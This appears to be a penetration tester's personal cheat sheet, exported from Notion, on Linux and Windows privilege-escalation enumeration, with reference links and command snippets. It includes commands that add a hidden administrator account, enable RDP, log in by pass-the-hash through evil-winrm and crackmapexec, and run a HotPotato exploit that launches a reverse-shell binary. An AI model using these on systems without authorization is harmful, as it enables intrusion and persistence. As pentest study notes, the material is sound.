<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Initial Enumeration</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="000917ee-4910-4392-bb17-c415ef54fab4" class="page sans"><header><h1 class="page-title">Initial Enumeration</h1></header><div class="page-body"><ul id="5d863a0a-efda-4451-819f-9c6ecf3e668c" class="bulleted-list"><li style="list-style-type:disc"><a href="https://sirensecurity.io/blog/windows-privilege-escalation-resources/">https://sirensecurity.io/blog/windows-privilege-escalation-resources/</a></li></ul><ul id="753453a8-330a-4fd1-bfb0-a2500d4c21ec" class="bulleted-list"><li style="list-style-type:disc">fuzzysecurity <a href="https://www.fuzzysecurity.com/tutorials/16.html">https://www.fuzzysecurity.com/tutorials/16.html</a></li></ul><ul id="df18ddc3-5b3d-4e84-8e6d-1e967668d399" class="bulleted-list"><li style="list-style-type:disc">Absolomb Windows Privilege Escalation Guide - <a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></li></ul><ul id="b90a6585-1432-44a0-b7de-e7a36089305b" class="bulleted-list"><li style="list-style-type:disc"><a href="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation">https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation</a></li></ul><ul id="e613e752-b974-46c2-8454-4930b0b9134e" class="bulleted-list"><li style="list-style-type:disc">Sushant 747&#x27;s Guide (Country dependant - may need VPN) - <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html</a></li></ul><hr id="bc6229f6-9d53-44c9-90e5-e41e550211c3"/><p id="57230e8e-de48-42e3-ad08-a01dd1798021" class=""><strong>Methodology:</strong></p><ol type="1" id="b0104712-e5be-45b4-8db3-9afa3e9b9251" class="numbered-list" start="1"><li>See what tools are installed that I usually use (which python3, which wget, which curl, which nc, etc. Also uname -a to see kernel version.</li></ol><ol type="1" id="0145bf85-189d-4529-9052-aee0e44fe127" class="numbered-list" start="2"><li>list out all files in directories such as /tmp, /opt, /mnt, /media, /home,
/etc/passwd (write perms?), /var/www/ (config files?), numerous times
just doing this has shown me the path to root that other scripts
wouldn&#x27;t really find.</li></ol><ol type="1" id="5ad529d5-3993-4e1d-a4a6-707dbe743f51" class="numbered-list" start="3"><li>echo $PATH (anything weird?), cat /etc/crontab (any weird jobs?), sudo -l (any sudo perms?)</li></ol><ol type="1" id="375effa3-8182-4a71-b189-30899793d3f3" class="numbered-list" start="4"><li>finally, look for SUID perms on files and compare output against <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>find <strong>/</strong> -perm <strong>u=s</strong> -type f 2&gt;/<strong>dev</strong>/<strong>null</strong></li></ol><ol type="1" id="5422034e-1dcb-496e-a5fd-0bafda539a08" class="numbered-list" start="5"><li>then run linpeas<strong>Windows:</strong> <a href="https://sirensecurity.io/blog/windows-privilege-escalation-resources/"><strong>https://sirensecurity.io/blog/windows-privilege-escalation-resources/</strong></a></li></ol><ol type="1" id="f8f83746-3d36-4863-84df-759b923aa827" class="numbered-list" start="6"><li>whoami /priv (seImpersonate?), net users (any other users?), net user &lt;username&gt; (are you admin group? UACBypass?)</li></ol><ol type="1" id="a190acd8-8717-4780-8d20-efa22c85f173" class="numbered-list" start="7"><li>Again look in a bunch of directories, this has found the way a lot of times.
Look in C:\ (any backup directory or something odd?), C:\Program Files
&amp; Program Files (x86) (for the non-windows folders, look up any priv esc vulnerabilities with them?), C:\Users, C:\Windows\Temp</li></ol><ol type="1" id="5bed8b10-80d9-4667-9524-b6ed6712b55f" class="numbered-list" start="8"><li>wmic service get name,startname, this will list services, I usually skim
through this quick and look at any non windows ones. Specifically the
binary path, either if its unquoted or if you have write access to the
directory of the binary.</li></ol><ol type="1" id="f7c229e6-9da7-42f0-9be3-5cc684df06d4" class="numbered-list" start="9"><li>winpeas, make note of the section that tells you what directories are writeable by you.</li></ol><p id="7fa48cc3-3d54-4fe1-b97e-87d0ffa24b39" class="">
</p><hr id="cddd09d6-2b74-4623-9515-aab592ee04d7"/><p id="f57ba8c3-9c7c-4573-9bd7-acb61c3dcda7" class=""><strong>System Enumeration:</strong></p><pre id="3f9b9ce4-a995-4047-a18a-234ee5d6dd4a" class="code"><code>systeminfo
systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot;
sysinfo (meterpreter)</code></pre><p id="9b62d99d-fe8d-45f4-a477-a4af3b804750" class="">
</p><ul id="b24e8860-a744-442b-9ddc-1617c3374b2a" class="bulleted-list"><li style="list-style-type:disc">Looking at patches hot fixes:</li></ul><pre id="24149cdf-c749-4194-a8ea-2a6f040e0735" class="code"><code>wmic qfe
wmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre><ul id="8f0f4a92-7dff-4f8e-b536-5856360b6fbb" class="bulleted-list"><li style="list-style-type:disc">Listing drives:</li></ul><pre id="3c544e29-f12f-4f17-9c80-17a2ff255b02" class="code"><code>wmic logicaldisk
list drives
wmic logicaldisk get caption,description,providername</code></pre><p id="c798bad5-c100-4121-be18-16929f02d65e" class="">
</p><p id="51607327-99c3-42bf-9df7-277b3c3b2cc2" class=""><strong>User Enumeration:</strong></p><p id="fa39ec7c-0e75-43aa-888e-e668585793d4" class="">
</p><ul id="23818f36-82a5-4b20-ad36-8bed1843ad01" class="bulleted-list"><li style="list-style-type:disc">name</li></ul><pre id="226ed712-ac0e-47e9-bb45-00b14d1baa7d" class="code"><code>whoami</code></pre><ul id="15499b58-e007-4a23-ac19-70b8e21c1b3e" class="bulleted-list"><li style="list-style-type:disc">priv</li></ul><pre id="357946aa-5514-4888-83d1-abdf8dd93d94" class="code"><code>whoami /priv</code></pre><ul id="c59c1037-7a87-426d-8cab-8268b08755d8" class="bulleted-list"><li style="list-style-type:disc">groups</li></ul><pre id="dbfc2030-3da0-4c09-8bef-fc0fecd6f80c" class="code"><code>whoami /groups</code></pre><p id="84781da2-2f9c-4aa4-b4a3-c522d33c32b7" class="">
</p><ul id="d798a691-b167-4171-8c7e-ded37253a3ce" class="bulleted-list"><li style="list-style-type:disc">info on users</li></ul><pre id="05035c1f-a871-44b2-9454-e3b39fa5aef0" class="code"><code>net user &lt;user&gt;
net user domain
net user
#change password
net user &lt;user&gt; &lt;password&gt;</code></pre><ul id="d2401a9d-25cc-427a-b5c1-cbe5b0e51f45" class="bulleted-list"><li style="list-style-type:disc">local groups</li></ul><pre id="f9460f22-0553-4cd1-a15a-2e337cce09b2" class="code"><code>net localgroups
net localgroup &lt;group?&gt;</code></pre><p id="defb30b1-24fc-4959-8c5b-e7142fef8f48" class="">
</p><p id="7012570f-482c-40b0-ae78-417b382b8069" class=""><strong>Network Enumeration:</strong></p><ul id="93b36466-68cd-49b8-9b59-cf762c80200e" class="bulleted-list"><li style="list-style-type:disc">ip config</li></ul><pre id="101bd221-59ff-49bd-a1ec-17456bcb7a6a" class="code"><code>ipconfig (/all)</code></pre><p id="834fa83f-713f-4218-871c-ba9b1b812120" class="">arp table</p><pre id="39f0fa88-9509-4236-b8b3-97e75c064325" class="code"><code>arp -a</code></pre><p id="56a08bfc-6f51-446f-89c1-40ea13bc8e78" class="">routing table</p><pre id="d43ddb66-9c7d-4b68-a8a8-d12dab41d125" class="code"><code>route print</code></pre><p id="69c2dd2c-74fc-40f0-a91c-5e45ab212071" class=""> netstat</p><pre id="c79b4aff-2c0e-4ea0-8ed3-f7e9de4893d3" class="code"><code>netstat -ano</code></pre><p id="82078565-cab1-416f-83e9-b0a3991eb82f" class="">
</p><p id="5af5067a-9e00-4a60-ae02-9bc3c6deb874" class=""><strong>Password Hunting:</strong></p><pre id="1725608f-9c6a-4cd0-8b09-8327d56dcf22" class="code"><code>findstr /si password *.txt *.ini *.config</code></pre><p id="e08e800c-d100-4187-938d-6d52f3a8a3ed" class="">
</p><p id="8a0b9de3-1662-4f8f-9a2f-5e6e25716a8e" class=""><strong>Firewall and AV Enumeration:</strong></p><p id="9da1f1c3-0881-469e-a442-0780ccf43016" class="">service control</p><pre id="c812f72e-b6c1-4b67-aaee-40c3ee574a11" class="code"><code>sc query windefend
sc queryex type= service</code></pre><p id="2e2c8800-2601-4d1b-8fc9-2601c1631691" class="">Firewall settings:</p><pre id="b32efded-9d9b-4757-aed3-e459b38c720e" class="code"><code>netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config</code></pre><p id="93de35ca-3035-4dd4-8e6c-f9de104e75f6" class="">
</p><p id="4a4bfafd-e5a9-47a3-bec7-906a1a44f862" class=""><strong>Scheduled Tasks:</strong></p><pre id="12e115d8-6a35-4441-9d8f-a5e6e150a402" class="code"><code>schtasks /query /fo LIST /v
PS&gt; Get-ScheduledTask | where {$_.TaskPath -notlike &quot;\Microsoft*&quot;} | ft TaskName,TaskPath,State</code></pre><p id="546341a7-c3ca-456d-9bc4-535e0e027ab4" class="">
</p><p id="99bbc802-f194-4e0b-90db-39ce0e06dd2d" class=""><strong>Insecure GUI Apps:</strong></p><pre id="639272a8-c0fa-4a98-a4c3-15fb9b255a6e" class="code"><code>tasklist /V | findstr &lt;task-run-by-admin&gt;</code></pre><p id="4a3e4686-e75a-4d94-a7fa-1b3b7f565a4e" class="">
</p><p id="436378b6-ed64-449c-a14d-4abca7341669" class=""><strong>Add user:</strong></p><pre id="a82198ea-45a7-49ff-b5bb-11ad3eb11e40" class="code"><code>net user test password123! /add
net localgroup Administrators test /add
net localgroup &quot;Remote Desktop Users&quot; test /add
reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f
rdesktop 0.0.0.0 -u test -p password123!</code></pre><p id="61275796-528c-46d2-aea0-1d715502547d" class="">Another way:</p><pre id="a20d2dac-c504-4bd4-91d2-98f562e46a0b" class="code"><code>text.txt | net user pwn Password1! /add; net localgroup administrators pwn /add</code></pre><p id="5671aa8a-e112-4df1-bbd5-f4b72bf63c46" class="">
</p><p id="1996e6d3-9066-4af2-84b4-2894e8a771bd" class=""><strong>Find writable directories</strong></p><pre id="de998531-11ad-4f26-9045-4f5a935fa3cb" class="code"><code>find / -type d -writable -print
find -type f -maxdepth 1 -writable</code></pre><p id="07752bc6-a641-437b-8c75-bd5ffc00aab2" class="">
</p><p id="f6e25951-13ad-4b23-9487-cdf801b8e394" class="">Check app data for powershell history, clear text credentials</p><p id="d6e09ed3-3045-43e7-92ba-b19fa215d8b0" class="">Check recycle bins, saved browser passwords, saved program passwords.</p><p id="080dba3d-0a40-4445-bad5-c4399dbb2ac7" class="">
</p><p id="86f8489f-f7ac-451d-875d-c72e2238d843" class=""><strong>Evil Winrm:</strong></p><pre id="90e3c2a9-00f7-431a-91b9-fdba506f5652" class="code"><code>evil-winrm -i 0.0.0.0 -u pwn -p &#x27;Password1!&#x27;
evil-winrm -i 0.0.0.0 -u pwn -H &lt;Hash&gt;
crackmapexec winrm -u pwn -H &lt;Hash&gt;</code></pre><p id="6c99333a-7bd3-4c18-b089-67a762d7ff16" class="">
</p><p id="15adbf57-025e-4eb2-bd07-04d95bf3692e" class=""><strong>Enabling remote desktop:</strong></p><p id="0c0b8241-bbc5-4715-9719-996a6d698985" class=""><a href="https://www.thewindowsclub.com/enable-remote-desktop-using-command-line">https://www.thewindowsclub.com/enable-remote-desktop-using-command-line</a></p><pre id="d00e005d-f267-46db-98f3-6829ee926d79" class="code"><code>#Command Line
reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group=&quot;remote desktop&quot; new enable=yes
#Powershell
Set-ItemProperty -Path &#x27;HKLM:\System\CurrentControlSet\Control\Terminal Server&#x27;-name &quot;fDenyTSConnections&quot; -Value 0
Enable-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;</code></pre><p id="89aada47-ed9b-48f6-96df-a334d0894fa0" class="">
</p><pre id="2cc5e0e4-afd8-414c-9915-215ea92942ad" class="code"><code>Start-Process -NoNewWindow -FilePath C:/File.exe</code></pre><p id="aa441897-7bd0-4fbf-907d-20178cf46e7b" class="">
</p><p id="0375e7ea-7bfa-456c-a0c6-5c83414a079b" class="">HotPotato:</p><pre id="3fa06b32-f7a8-473a-a048-aa13c23e2890" class="code"><code>.\potato.exe -ip 0.0.0.0 -cmd &quot;C:\reverse.exe&quot; -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true</code></pre></div></article></body></html>